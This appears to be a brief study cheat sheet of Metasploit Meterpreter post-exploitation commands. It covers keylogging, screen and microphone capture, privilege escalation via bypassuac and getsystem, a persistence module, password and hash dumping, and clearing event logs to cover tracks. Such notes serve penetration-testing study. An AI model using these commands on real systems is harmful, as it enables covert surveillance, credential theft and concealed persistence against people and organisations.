# Post Exploitation

We want to elevate our privileges, maintain persistence, and look for useful information on the target machine. This is information gathering on the target machine

* Look at files for sensitive data
* Upload additional files
* Steal passwords
* Control network
* Run a keylogger

## Meterpreter Basic Commands

`help` - list all commands

`background` or `bg` - puts current session in background, allowing you to navigate between multiple sessions

`sessions` - switch between sessions

`download` - download a specific file from target

`upload` - upload a specific file to target

`shell` - open up target shell

Linux commands also work to navigate file system

`execute` - execute a command

`kill` - terminate a process (need process id)

`ps` - lists all processes currently running on a system

`reboot` - reboots target computer

`shutdown`

`sysinfo` - additional info on target computer

`mouse` - you can send specific mouse commands to the target mouse

`keyscan-start` - start a keylogger

`keyscan-dump` - display all captured keystrokes

`keyscan-stop` - stop keylogger

`screenshot` - saves a screenshot of target desktop

`screenshare` - starts streaming target's screen

`record_mic` - records microphone for a specified period of time

`getsystem` - attempts to elevate privilege on the target

## Elevating Privileges

Many of the scripts have patches, but they're worth testing on a target

in msfconsole - 

`search 2020` - search for current exploits. Look for exploit/windows/local

`search bypassuac` - read the info about the exploit before running it

## Creating Persistence on Target

Allows us to stay on the target machine even after the target gets rebooted. This is one of the first things we want to do on a target machine.

`search persistence`

`use exploit/windows/local/persistence_service`

## Additional Helpful Modules

`search` - search for file types on target
`search -f *.jpg`

`clearev` - clears the event log. Useful for covering tracks

msfconsole - 

`search post/windows` - lists wireless interfaces and possible passwords from target wireless access points. Can target Chrome, VMs, etc.

`search passwords`

`search hashdump`

You can also run msf commands from meterpreter shell

`run post/windows/gather/enum_applications` - lists all installed applications on a target